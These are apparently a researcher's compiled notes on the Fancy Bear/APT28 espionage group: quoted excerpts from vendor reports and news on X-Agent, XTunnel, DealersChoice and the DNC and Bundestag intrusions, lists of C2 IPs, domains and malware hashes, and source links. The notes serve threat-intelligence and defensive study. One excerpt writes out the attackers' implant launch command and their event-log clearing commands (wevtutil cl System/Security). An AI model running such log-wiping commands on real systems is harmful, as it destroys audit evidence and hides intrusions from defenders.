The fourth and latest version of the malware comes with new techniques for obfuscating strings and all run-time type information. The techniques, according to ESET, have significantly improved the malware's encryption abilities. The Fancy Bear/Sednit group also has upgraded some of the code used for command and control (C&C) purposes and added a new domain generation algorithm (DGA) feature for quickly creating fallback C&C domains.
In addition to the encryption and DGA, Fancy Bear also has some internal improvements such as new commands that can be used for hiding malware configuration data and other data on a target system. The authors of the malware have redesigned and refactored some existing components so it has become harder to recognize previously discovered mechanisms. Xagent also now has the ability to take screenshots of the target's desktop.
It has largely stopped using Sedkit, an exploit kit used in numerous previous attacks, and has increasingly begun using a platform called DealersChoice to initially breach systems.
DealersChoice, according to ESET, can generate documents with embedded Adobe Flash Player exploits. One version of the platform is designed to first check which version of Flash Player a target system might be running and then exploit it. Another variant first contacts a C&C server and then deliver a selected Flash exploit.
Like the previous Sedkit exploit kit, DealersChoice is designed to scour international news stories and include references to relevant ones in the malicious emails it generates and sends to potential targets.

https://www.securityweek.com/xtunnel-malware-specifically-built-dnc-hack-report
The XTunnel malware that was used by Russian APT threat actor Fancy Bear to penetrate the Democrat National Committee (DNC) network was specifically designed to work against this target, Invincea researchers say.
The attack was carried out in April this year, but was the second time a Russian threat actor targeted DNC, after another group going by the name of Cozy Bear managed to penetrate the network in the summer of 2015. The incidents were analyzed by Crowdstrike, after DNC employees started receiving alerts from Yahoo regarding their potential account compromises.
The researchers discovered that the Fancy Bear threat actor used the XTunnel malware for compromise purposes. After taking a closer look at the malware, Invincea discovered that the malware didn’t cluster with other known threats and says that it was likely a “purpose-built original piece of code” meant to target the DNC network specifically.
As it turns out, the XTunnel tool has several capabilities that allowed it to easily compromise the targeted network, including VPN-style capabilities and the use of encryption (it exchanges SSH keys, uses private encryption keys, compresses and decompresses data, etc.). The malware also supports access to locally stored passwords, and can access the LDAP server, researchers discovered.
What’s more, the threat is modular, meaning that it can download additional files when needed, and can also probe the network for open ports, PING hosts, and send and receive emails. The malware has many other capabilities, some of which are shared by legitimate programs, Invincea reveals.
Some of the most important functions of the tool, however, include the ability “to hook into system drivers, access the local LDAP server, access local passwords, use SSH, OpenSSL, search and replace local files, and of course be able to maintain a persistent connection to a pre-specified IP address, even if the host is behind a NATed firewall,” Invincea’s Pat Belcher explains.
As if these abilities weren’t enough, the threat was also found to be able to monitor keyboard and mouse movements, and even to access webcams and USB drives. “That is a lot of capabilities packed into a file that is less than 2 MB in size,” Belcher notes.
Another interesting aspect of XTunnel is that its code isn’t obfuscated, as most modern malware employs this technique to make analysis challenging. This piece of malware contains strings of code that appear to be transparently showing exactly what the binary is intended to do, “as if it were originally developed to be an open source tool to provide encrypted tunnel access to internet hosts,” the security researcher says.
The researchers also discovered that the hackers used a very old but reliable network module –associated with softphone and VoIP applications over a decade ago – to maintain a fully encrypted, end-to-end Remote Access Trojan (RAT)

https://www.invincea.com/2016/07/tunnel-of-gov-dnc-hack-and-the-russian-xtunnel/
Fancy Bear XTunnel binary, which posed as a file called “vmupgradehelper.exe.”  Its MD5 is 9e7053a4b6c9081220a694ec93211b4e
Cosybear also uses XTunnel
Invincea uses its DARPA-funded deep learning to automatically analyze and extract known capabilities of malware based on matching strings to StackOverflow definitions, and where possible, cluster them into related families of malware based on similarities of design and function.  The XTunnel malware used by Russian threat actor Fancy Bear did not cluster with other known malware, meaning this binary was likely a purpose-built original piece of code to be used specifically against the DNC.
XTunnel Origins
Back in 2004, in the heyday of VoIP and soft phones, a company called Xten created a family of SIP products based on their XTunnel protocol.  Softphones and VoIP applications couldn’t reliably operate inside of a firewalled environment that used Network Address Translation (NAT) without having to open up huge port ranges through the firewall.  Requests for such port changes drove Security Administrators absolutely nutty.
The solution was to use a new protocol where an inside node would contact an external broker node and establish a two-way connection over whatever available port the VoIP/SIP software could find.  I even remember seeing utilities like Skype portscan the inside NIC of a firewall looking for a way out.  If it could get out via port 25 SMTP, it would take it.  Ditto for AOL messenger and similar utilities.

The XTunnel Project became closed source and proprietary intellectual property when Xten was absorbed into a parent company during the years that the VoIP market began consolidating.  There are a few independent developers that are still using the pieces of the XTunnel platform for network encryption.  For instance, below is a screenshot of the XTunnel PortMap client developed in Chinese.  This module does have some similar capabilities to the Russian binary above when viewed using Invincea’s Deep Learning. It also shares the attributes of clean transparent listing of strings between the Russian and Chinese version of XTunnel.
The Fancy Bear threat actors used, by today’s standards, a very old, but still reliable network module used for softphone and video and VoIP capabilities to maintain a fully encrypted, end-to-end Remote Access Trojan (RAT).  Perhaps the only way the DNC could have detected the network activity associated with the Xtunnel is to have caught it “port knocking” on the inside of the firewall.  But with so many organizations running a firewall configuration allowing any inside host outbound without restrictions, this would have been almost impossible to detect with logs only.  Even if they had restricted outbound access XTunnel could have used other protocols such as ICMP or UDP to find its way outbound to the Russian command and control server.
The Invincea Deep Learning analysis neither supports nor refutes the Russian origins of the XTunnel binary.  The binary appears to be a repurposed open source tool that was used for nefarious purposes within the DNC.

Previous reports from Crowdstrike and others note that the XTunnel tool was used to maintain network connectivity.  Whether the XTunnel tool was used for additional purposes as its capabilities suggest is unknown, but it had the potential to support a full range of additional activity.

SHA256 Hashes shown:

VMUgradehelper:  4845761c9bed0563d0aa83613311191e075a9b58861e80392914d61a21bad976
XTunnel Port Mapper:  b81b10bdf4f29347979ea8a1715cbfc560e3452ba9fffcc33cd19a3dc47083a4

https://www.securityweek.com/russian-cyberspies-use-new-mac-malware-steal-data
APT28 has been known for using an OS X downloader named Komplex, and researchers from Bitdefender and Palo Alto Networks have now come across another Mac malware believed to be part of the group’s arsenal.
XAgent, or X-Agent, is a Trojan used by APT28 in attacks targeting Windows systems. A recently analyzed campaign aimed at Ukraine indicates that the group may have also developed an Android version of XAgent.
Bitdefender and Palo Alto Networks have also identified a macOS version of XAgent, which they believe is downloaded to targeted systems by the Komplex downloader. Both security firms determined, based on binary strings, that Komplex and XAgent were likely created by the same developer.
Once it infects a Mac computer, the malware, which its authors call XAgentOSX, contacts a command and control (C&C) server and waits for instructions. C&C communications are similar to the ones used by the Windows version of XAgent.
XAgentOSX can collect information about the system, running processes and installed applications, it can download and upload files, execute commands and files, and take screenshots.
The malware also looks for backup files from an iPhone or iPad, which it can exfiltrate using one of the available commands. XAgentOSX can also log keystrokes, allowing the attackers to obtain the victim’s credentials.
Bitdefender told SecurityWeek that it does not have any information on XAgentOSX infections and targets, but the company believes the victims are hand-picked in an effort to prevent the exposure of malware samples.
One of the actor’s favorite Linux tools is Fysbis, an unsophisticated yet efficient backdoor.

https://www.threatconnect.com/blog/finding-nemohost-fancy-bear-infrastructure/
n reviewing domains with registration consistencies to previously identified FANCY BEAR domains, we identified the domain unisecproper[.]org and included it in our ThreatConnect Intelligence source. This domain was registered using the email address le0nard0@mail[.]com, is hosted on a dedicated server at the IP 92.114.92.134, and uses a name server that has previously been associated with FANCY BEAR activity.
In reviewing Censys for the 92.114.92.134 IP address, we identify that a web server on that IP currently uses the SSL certificate f27c4270b9b9291f465ba5962c36ce38f438377acff300b5c82b3b145f0c9e94
Reviewing this hash in Censys identifies the SHA1 as a1833c32d5f61d6ef9d1bb0133585112069d770e. Cybersecurity researchers -- including Thomas Rid and Mark Parsons -- have identified that this SSL certificate has been associated with FANCY BEAR activity, including operations targeting the DNC and German Parliament. This indicates that the unisecproper[.]org domain, which is the only one hosted at this IP, most likely is associated with FANCY BEAR activity.
185.86.150.26
5.135.199.31
188.40.155.241 (static.241.155.40.188.clients.your-server.de)
185.183.107.38
179.43.128.218
unisecproper[.]org	208.91.197.91	le0nard0@mail[.]com
wmiapp[.]com	179.43.128.218	Private
networkxc[.]net	185.183.107.38	bertfuhrmann@gmx[.]de
ndsee[.]org	185.86.150.26	manuel.herez@centrum[.]cz
neoderb[.]com	188.40.155.241	Private
remnet[.]org	188.40.155.241	cameron_gordon@centrum[.]cz
remotemanagesvc[.]net	188.40.155.241	Private
netcorpscanprotect[.]com	94.177.12.157	ernesto.rivero@mail[.]com
zpfgr[.]com	94.177.12.74	olavi_nieminen@suomi24[.]fi
connectsmd[.]net	86.107.42.11	Private
ckgob[.]com	88.99.21.169	luc_ma@iname[.]com
the domains neoderb[.]com, wmiapp[.]com, and connectsmd[.]net, all initially used a nemohosts[.]com name server when they were first registered suggesting that these domains were registered through the Nemohosts reseller. A review of WHOIS history indicates that only about 160 domains have used nemohosts[.]com name servers, suggesting that it is a relatively small service. Shortly after they were registered, the three domains switched to using a topdns.com name server. 
neoderb[.]com	188.40.155.241
wmiapp[.]com	179.43.128.218
connectsmd[.]net	86.107.42.11
dmsclock[.]org	89.187.151.16
systemfromcuriousmoment[.]com	185.86.150.188
driverfordell[.]com	5.255.80.50
hostsvcnet[.]com	185.94.190.199
intelstatistics[.]com	5.135.199.10
knightconsults[.]com	174.128.253.215
lopback[.]com	185.86.150.151
nethostnet[.]com	86.105.1.12
perfect-remote-service[.]com	188.241.68.175
probenet[.]eu	86.105.1.114
remonitor[.]net	185.94.192.101
societyatcuriousteacher[.]com	185.86.150.188
spelns[.]com	89.44.103.18
unitedprosoftcompany[.]org	95.153.31.197
Three other domains -- ndsee[.]org, zpfgr[.]com, and networkxc[.]net -- all used similarly obscure name servers dns1.bacloud[.]com and dns1.laisvas[.]lt, which likely belong to the same organization operating out of Lithuania.
ndsee[.]org	185.86.150.26
zpfgr[.]com	94.177.12.74
90update[.]com	213.252.244.105
aljazeera-news[.]com	213.252.244.114
ambcomission[.]com	185.25.51.38
cryptokind[.]com	213.252.246.24
deshcoin[.]com	185.25.48.249
dochardproofing[.]com	185.25.51.173
ebramka[.]info	185.25.50.156
fes-auth[.]com	91.108.68.209
hello76[.]com	185.64.105.7
hostedopenfiles[.]net	185.25.50.93
kiteim[.]org	5.255.80.68
kremotevn[.]net	86.105.1.128
lasarenas[.]lt	91.216.163.204
lopback[.]com	185.86.150.151
megauploadfiles[.]org	5.135.199.24
nemaskalitnium[.]com	173.44.58.240
networkfilehosting[.]com	213.252.247.167
news-almasirah[.]net	213.252.244.115
newsfromsource[.]com	91.216.163.224
platnosci[.]biz	213.252.247.121
postmarksmtp[.]com	185.25.51.120
remsvc[.]net	91.108.68.180
rhfcoin[.]com	91.216.163.229
sa7efa[.]com	91.216.163.237
searchbrain[.]net	91.216.163.203
serbview[.]com	5.255.93.224
startthedownload[.]com	213.252.247.168
showitem[.]lt	213.252.247.159
uploadsforyou[.]com	185.25.50.144
wintwinbtc[.]com	185.25.48.27

https://www.sans.org/summit-archives/file/summit-archive-1492179725.pdf
176.31.112.10
213.251.187.145
5.56.133.170
172.245.45.27
176.31.96.178
95.215.46.27
46.183.216.209
81.17.30.29
94.242.224.172
131.72.136.165
80.255.10.236
167.114.214.63
80.255.3.93
192.95.12.5
204.145.94.227
5.56.133.42
130.255.184.196
45.32.129.185
23.227.196.217
104.156.245.207
45.32.91.1
109.236.93.138
89.45.67.12
5.56.133.46
89.238.132.210
5.56.133.87
185.86.151.180
89.34.111.119
92.114.92.102
62.113.232.196
95.215.44.38
185.25.50.117
86.105.1.133
86.105.1.136
185.61.148.54
94.177.12.74
94.177.12.157
185.86.149.60

https://netzpolitik.org/2015/digital-attack-on-german-parliament-investigative-report-on-the-hack-of-the-left-party-infrastructure-in-bundestag/
19.06.2015
there's questions over some of this as the analysis of XTunnel doesn't talk of all the additional functionality others do, but check dates as Xtunnel could have been updated. Although while quoting Krebs around inaccuracies in other research, he says that research has the attribution correct where Krebs seems to think it's completely off

The first artifact – identified across this report as Artifact #1 – has the following attributes:

Name	winexesvc.exe
Size	23552
MD5	77e7fb6b56c3ece4ef4e93b6dc608be0
SHA1	f46f84e53263a33e266aae520cb2c1bd0a73354e
SHA256	5130f600cd9a9cdc82d4bad938b20cbd2f699aadb76e7f3f1a93602330d9997d
The second artifact – identified across this report as Artifact #2 – -has the following attributes:

Name	svchost.exe.exe
Size	1062912
MD5	5e70a5c47c6b59dae7faf0f2d62b28b3
SHA1	cdeea936331fcdd8158c876e9d23539f8976c305
SHA256	730a0e3daf0b54f065bdd2ca427fbe10e8d4e28646a5dc40cbcfb15e1702ed9a
Compile Time	2015-04-22 10:49:54

Artifact #1 was retrieved from a File Server operated by Die Linke. The file is a 64bit-compatible compiled binary of the open source utility Winexe. Winexe is software similar to the more popular PSExec and is designed to allow system administrators to execute commands on remote servers. While commercial solutions like Symantec pcAnywhere provide a larger feature-set, Winexe is lightweight, and doesn’t require any installation or configuration. One of the reasons Winexe is preferred over PSExec, is that it provides a Linux client, while PSExec doesn’t.
Attackers are making growing use of utilities like Winexe and PSExec to perform lateral movement across compromised networks. Besides providing the ability to execute arbitrary commands on the target system, these utilities normally don’t raise suspicion as they are commonly whitelisted by Antivirus and other commercial security software.
Winexe acts as a Windows service that can be configured to automatically start at boot and silently wait for incoming commands over a named pipe. Named pipes are a Windows inter-process communication method. Through named pipes, processes are able to communicate and exchange data even over a network. In the case of Artifact #1, the name of the pipe is „ahexec“, computers over the network could access the pipe server by simply opening a file handle on „\ServerNamepipeahexec“.
Once connected to the pipe, a user or a program can easily provide information required to execute command (just as they would normally through a command-line). The provided information is then passed to a „CreateProcessAsUserA“ call and the specified command is executed.
Once inside the network, Artifact #1 can be enough for the attacker to download or create additional scripts, execute commands and exfiltrate data (for example, simply through ftp). It is plausible that Artifact #1 could be present on other servers under different names, although it is also likely that the attacker only left it on servers to which they required maintainenance of persistent access.

Artifact #2 was recovered from the Admin Controller operated by Die Linke. This is custom malware, which despite large file size (1,1 MB), provides limited functionality. Artifact #2 operates as a backchannel for the attacker to maintain a foothold inside the compromised network. The properties of the artifact show that the same authors of the malware seem to have called it „Xtunnel“. As the same name suggests, the artifact appears in fact to act as a tunnel for the attacker to remotely access the internal network and maintain persistence.
The artifact is dependent on a working network connection in order to function properly. In case connectivity can’t be established, the process will lock in an endless loop as shown in the behavioral schema below:
After initialization, the artifact will attempt to establish a connection by creating a socket. In case of failure, it will sleep for three seconds and try again. The authors of the malware didn’t appear to have spent any effort in concealing indicators or obfuscating code – the IP address with which it tries to communicate is hardcoded in clear-text inside the binary. We can observe below, the procedure through which the artifact attempts to establish a connection with the IP address „176.31.112.10“:
This specific IP address is a critical piece of information that enables us to connect this attack to a spree of previous targeted campaigns. The details of this attribution is explained in a dedicated section below. We will refer to this IP address as „Command & Control“ (or „C&C“).
The artifact is able of receiving multiple arguments, including -Si, -Sp, -Up, -Pp, -Pi and -SSL. Following are the beaconing packets the artifact will send to Command & Control:
If the argument -SSL is given through command-line to the artifact, these beacons will be encapsulated in an SSL connection and a proper TLS handshake will be initiated with the C&C.
Interestingly, the artifact bundles a copy of OpenSSL 1.0.1e, from February 2013, which causes the unusually large size of the binary. More importantly, the Command & Control server (176.31.112.10) also appears to be using an outdated version of OpenSSL and be vulnerable to Heartbleed attacks. While unlikely, it is worth considering that the same C&C server might have been the subject of 3rd-party attacks due to this vulnerability.
If connections to the C&C are blocked or terminated through a firewall, the artifact will be inhibited, as it doesn’t seem to have any fallback protocol. Additionally, since it does not execute any other functionality autonomously, it would no longer be a direct threat.
The address, 176.31.112.10, is a dedicated server provided by the French OVH hosting company, but is apparently operated by an offshore secure hosting company called CrookServers.com and seemingly located in Pakistan
By researching historical data relevant to C&C 176.31.112.10, we discovered that on February 16th 2015, the server was sharing an SSL certificate with another IP address allocated to CrookServers and also hosted at OVH: „213.251.187.145“.
More importantly, the IP address this certificate was shared with – 213.251.187.145 – was previously identified as used by Sofacy Group for phishing attacks against Albanian government institutions by registering the domain „qov.al“ (notice, the letter „q“ instead of „g“) and creating realistic subdomains to lure victims into visiting. The domain was active on the IP 213.251.187.145 from July 2014 up until March 2015.

https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/
This adversary has a wide range of implants at their disposal, which have been developed over the course of many years and include Sofacy, X-Agent, X-Tunnel, WinIDS, Foozer and DownRange droppers, This group is known for its technique of registering domains that closely resemble domains of legitimate organizations they plan to target. Afterwards, they establish phishing sites on these domains that spoof the look and feel of the victim’s web-based email services in order to steal their credentials
At DNC, COZY BEAR intrusion has been identified going back to summer of 2015, while FANCY BEAR separately breached the network in April 2016. 
FANCY BEAR adversary used different tradecraft, deploying X-Agent malware with capabilities to do remote command execution, file transmission and keylogging. It was executed via rundll32 commands such as:
rundll32.exe “C:\Windows\twain_64.dll”
In addition, FANCY BEAR’s X-Tunnel network tunneling tool, which facilitates connections to NAT-ed environments, was used to also execute remote commands. Both tools were deployed via RemCOM, an open-source replacement for PsExec available from GitHub. They also engaged in a number of anti-forensic analysis measures, such as periodic event log clearing (via wevtutil cl System and wevtutil cl Security commands) and resetting timestamps of files.
fd39d2837b30e7233bc54598ff51bdc2f8c418fa5b94dea2cadb24cf40f395e5	FANCY BEAR	SHA256	twain_64.dll
(64-bit X-Agent implant)

4845761c9bed0563d0aa83613311191e075a9b58861e80392914d61a21bad976	FANCY BEAR	SHA256	VmUpgradeHelper.exe (X-Tunnel implant)
40ae43b7d6c413becc92b07076fa128b875c8dbb4da7c036639eccf5a9fc784f	FANCY BEAR	SHA256	VmUpgradeHelper.exe
(X-Tunnel implant)

185[.]86[.]148[.]227:443	FANCY BEAR	C2	X-Agent implant C2
45[.]32[.]129[.]185:443	FANCY BEAR	C2	X-Tunnel implant C2
23[.]227[.]196[.]217:443	FANCY BEAR	C2	X-Tunnel implant C2

https://www.welivesecurity.com/2016/10/25/lifting-lid-sednit-closer-look-software-uses/
## Links

https://fancybear.net/ - their site...

https://www.facebook.com/FancyBearsHackTeam1/ - appears to be taken down

https://twitter.com/FancyBears



https://www.welivesecurity.com/2016/10/25/lifting-lid-sednit-closer-look-software-uses/

https://www.noticeofpleadings.com/strontium/ microsoft's suit

https://www.fireeye.com/blog/threat-research/2017/08/apt28-targets-hospitality-sector.html

https://en.wikipedia.org/wiki/Fancy_Bear

https://www.wired.com/story/russia-election-hacking-playbook/

https://arstechnica.com/tech-policy/2016/12/obama-tosses-35-russians-out-of-us-sanctions-others-for-election-meddling/

https://www.wordfence.com/blog/2016/12/russia-malware-ip-hack/

https://nakedsecurity.sophos.com/2017/02/13/fancy-bear-whos-behind-the-group-implicated-in-so-many-political-hacks/

http://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-targets-german-christian-democratic-union/

https://www.fireeye.com/blog/threat-research/2014/10/apt28-a-window-into-russias-cyber-espionage-operations.html

https://netzpolitik.org/2015/digital-attack-on-german-parliament-investigative-report-on-the-hack-of-the-left-party-infrastructure-in-bundestag/

https://ccdcoe.org/cycon-us-website-info-used-decoy-malicious-campaign.html

https://www.nytimes.com/2018/01/10/sports/olympics/russian-hackers-emails-doping.html?_r=1

http://www.securityweek.com/russia-linked-attacks-political-organizations-continue

http://www.securityweek.com/hackers-leak-olympic-committee-emails-response-russia-ban

https://blog.trendmicro.com/trendlabs-security-intelligence/update-pawn-storm-new-targets-politically-motivated-campaigns/

http://www.therepublic.com/2018/01/12/eu-russian-hackers-senate/

http://www.news18.com/news/tech/russia-apparently-hacking-winter-olympics-emails-report-1629201.html

https://www.wired.com/story/russian-fancy-bears-hackers-release-apparent-ioc-emails/?mbid=nl_011118_daily_list1_p4

https://threatconnect.com/blog/duping-doping-domains/?utm_campaign=Nurture%202017&utm_source=hs_email&utm_medium=email&utm_content=59950890&_hsenc=p2ANqtz-8-jLcf4gUp-qodQfiwsPPXPxu5TgLCSJY8LPQEr5kVKNnIt2UNt-nwzwbwghANIFgFnIwF8OR3m_DNFKGSWiaYmjwNDA&_hsmi=59950890

https://www.verfassungsschutz.de/embed/broschuere-2016-03-bfv-cyber-brief-2016-01.pdf

https://www.salon.com/2017/09/24/russian-hackers-exploited-a-google-flaw-and-google-wont-fix-it/

http://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html

http://www.securityweek.com/russia-linked-attacks-political-organizations-continue

http://www.ibtimes.com/russian-hackers-duped-us-defense-contractors-exposing-secret-military-tech-2651207

https://www.securityweek.com/sofacy-attacks-overlap-other-state-sponsored-operations

https://www.securityweek.com/cyberattack-ongoing-against-german-government-network

https://www.securityweek.com/russia-linked-hackers-directly-targeting-diplomats-report

https://www.rferl.org/a/montenegro-seeks-stare-down-fancy-bear-ahead-election/29105869.html

http://www.cyberdefensemagazine.com/pawn-storm-used-a-new-flash-zero-day-in-attacks-on-the-nato-the-white-house/

https://www.businesswire.com/news/home/20180309005050/en/

http://it-online.co.za/2018/03/14/sofacy-shifts-focus-to-include-far-east/

https://securelist.com/blackoasis-apt-and-new-targeted-attacks-leveraging-zero-day-exploit/82732/

[2] https://researchcenter.paloaltonetworks.com/2016/12/unit42-let-ride-sofacy-groups-dealerschoice-attacks-continue/

[3] https://www.fireeye.com/blog/threat-research/2017/05/eps-processing-zero-days.html

[4] https://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-part1.pdf

https://www.welivesecurity.com/2017/12/21/sednit-update-fancy-bear-spent-year/

https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/

XTunnel capabilities
https://cynomix.invincea.com/sample/f09780ba9eb7f7426f93126bc198292f5106424b

https://www.securityweek.com/russia-used-android-malware-track-ukrainian-troops-report

https://www.securityweek.com/fysbis-backdoor-preferred-pawn-storm-group-target-linux

https://www.sans.org/summit-archives/file/summit-archive-1492179725.pdf

https://twitter.com/RidT/status/752528393678225408

http://malware.prevenity.com/2017/01/ataki-na-instytucje-rzadowe-grudzien.html

https://threatreconblog.com/2017/02/03/apt28-malicious-document/

https://www.virustotal.com/en/file/e2a850aeffc9a466c77ca3e39fd3ee4f74d593583666aea5b014aa6c50ca7af8/analysis/

https://www.virustotal.com/en/file/4b011c208f8779a76bed9cc0796f60c3c3da22e5e95365cc36824af62b960412/analysis/

https://netzpolitik.org/2015/digital-attack-on-german-parliament-investigative-report-on-the-hack-of-the-left-party-infrastructure-in-bundestag/

https://www.welivesecurity.com/2016/10/25/lifting-lid-sednit-closer-look-software-uses/

http://pwc.blogs.com/cyber_security_updates/2014/12/apt28-sofacy-so-funny.html

https://www.prnewswire.com/news-releases/root9b-uncovers-planned-sofacy-cyber-attack-targeting-several-international-and-domestic-financial-institutions-300081634.html and read https://krebsonsecurity.com/2015/05/security-firm-redefines-apt-african-phishing-threat/

https://apnews.com/3bca5267d4544508bb523fa0db462cb2?utm_campaign=SocialFlow&utm_source=Twitter&utm_medium=AP

https://www.wired.co.uk/article/dnc-hack-proof-russia-democrats

https://www.nytimes.com/2016/12/13/us/politics/russia-hack-election-dnc.html?_r=0

https://www.washingtonpost.com/world/national-security/cyber-researchers-confirm-russian-government-hack-of-democratic-national-committee/2016/06/20/e7375bc0-3719-11e6-9ccd-d6005beac8b3_story.html?utm_term=.2e520c62b2cb

https://www.secureworks.com/blog/russian-threat-group-targets-clinton-campaign

https://www.threatconnect.com/blog/tapping-into-democratic-national-committee/

http://www.itsecurityguru.org/2018/05/03/fancy-fancy-bear-lojack-anti-laptop-theft-tool-caught-phoning-home-kremlin/

https://www.scmagazine.com/fancy-bear-likely-behind-malware-found-on-lojack-c2-domains/article/763102/

https://www.securityweek.com/researchers-dissect-tool-used-infamous-russian-hacker-group

https://fancybear.net/pages/saga-about-doping.html

https://www.wired.com/story/vpnfilter-router-malware-outbreak/?CNDID=50740756&mbid=nl_052418_daily_list1_p1

https://blog.talosintelligence.com/2018/05/VPNFilter.html

https://www.securityweek.com/russian-cyberspies-change-tactics-recent-campaign

https://www.securityweek.com/vpnfilter-targets-more-devices-initially-thought

https://motherboard.vice.com/en_us/article/8xbnxp/mueller-indicts-12-russian-intelligence-officers-including-guccifer-20-for-hacking-democrats

https://www.securityweek.com/breaking-12-russian-intelligence-officers-indicted-hacking-us-democrats

https://www.securityweek.com/vpnfilter-malware-hits-critical-infrastructure-ukraine

https://www.wired.com/story/mueller-indictment-dnc-hack-russia-fancy-bear/?CNDID=53659400&mbid=nl_071318_daily_list1_p4

https://www.securityweek.com/leaked-chats-show-alleged-russian-spy-seeking-hacking-tools

https://arstechnica.com/information-technology/2018/07/from-bitly-to-x-agent-how-gru-hackers-targeted-the-2016-presidential-election/

https://www.securityweek.com/microsoft-disrupts-election-related-domains-used-russian-hackers

https://www.securityweek.com/sacrilegious-spies-russians-tried-hacking-orthodox-clergy
